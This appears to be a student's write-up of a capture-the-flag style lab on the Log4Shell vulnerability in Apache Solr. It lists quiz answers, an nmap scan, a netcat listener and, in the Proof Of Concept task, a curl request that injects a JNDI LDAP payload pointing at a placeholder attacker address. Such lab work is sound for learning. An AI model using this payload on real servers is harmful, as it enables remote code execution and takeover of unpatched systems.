# Log-4j-Solar-Writeup

## Task 1: Introduction

#### Log4j (Log4Shell) is a bug in a logging tool used in many apps.If a hacker sends a special message, the system may run their code by mistake.This lets the hacker control the system without logging in.

## Task 2: Reconnaissance

### What service is running on port 8983? (Just the name of the software)

By using Command :

###  nmap -Sv -p- 8983 10.48.130.26
We can able to find the Version of the port number 8983.


Correct Answer: Apache Solr

## Task 3: Discovery

#### 1.Take a close look at the first page visible when navigating to http://10.48.130.26:8983 (opens in new tab). You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?

<img width="958" height="528" alt="image" src="https://github.com/user-attachments/assets/d12fa9fd-12f3-4f27-a0af-fae2cc33f80c" />

Correct Answer: /var/solr/logs

#### 2.One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)

Correct answer: Solr.log

<img width="959" height="492" alt="image" src="https://github.com/user-attachments/assets/f29ee9b1-be26-438e-9477-019257b40519" />

The info has present in solr.log1,log2 files they asked the filename and it is Solr.log.

#### 3.What "path" or URL endpoint is indicated in these repeated entries?

Correct Answer: /admin/cores
#### 4.Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)

Correct Answer:params

<img width="946" height="526" alt="image" src="https://github.com/user-attachments/assets/4cebec2c-025f-4329-a162-de252040c4c1" />

### Task 4: Proof Of Concept
Here we are Connecting  nc -lnvp 9999  netcat to connect the  website  curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'   In this we change into attacker's op address to inject the vulnerablility malicious java code due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes so bash (your command-line shell) does not interpret it as a variable. And the connection received to the netcat port.

## Task 5: Exploitation

<img width="1156" height="855" alt="Screenshot 2026-03-22 235906" src="https://github.com/user-attachments/assets/6ad7c46c-46eb-4850-a73e-60ba0409f4a6" />
sudo apt install maven

mvn clean package -DskipTests

Also host a local python http server by using this command

python3 -m http.server

<img width="1919" height="1065" alt="Screenshot 2026-03-22 184129" src="https://github.com/user-attachments/assets/de288411-858d-4c2e-bde8-5546cb9de513" />

## Task 6: Persistance

Check user account through whoami

<img width="200" height="67" alt="image" src="https://github.com/user-attachments/assets/47729527-bc2e-4d38-8968-9d92e985b785" />

We did not know any usernames or passwords at the point, so trying against that protocol would be useless

It might be leads to changing passwords and data and informations

## Task 7: Detection

The detection is found by the logs checking present in there

<img width="765" height="85" alt="image" src="https://github.com/user-attachments/assets/93313bcc-6c23-44b5-a63e-f68c6a266047" />



## Task 8: Conclusion

<img width="959" height="523" alt="image" src="https://github.com/user-attachments/assets/b228816f-56a5-41b2-884e-bd1a0abec1d1" />

Overall, this vulnerability demonstrates that even small components like logging libraries can introduce massive risks if not properly secured. It reinforces the need for secure coding practices, dependency management, and proactive security testing in real-world environments.
























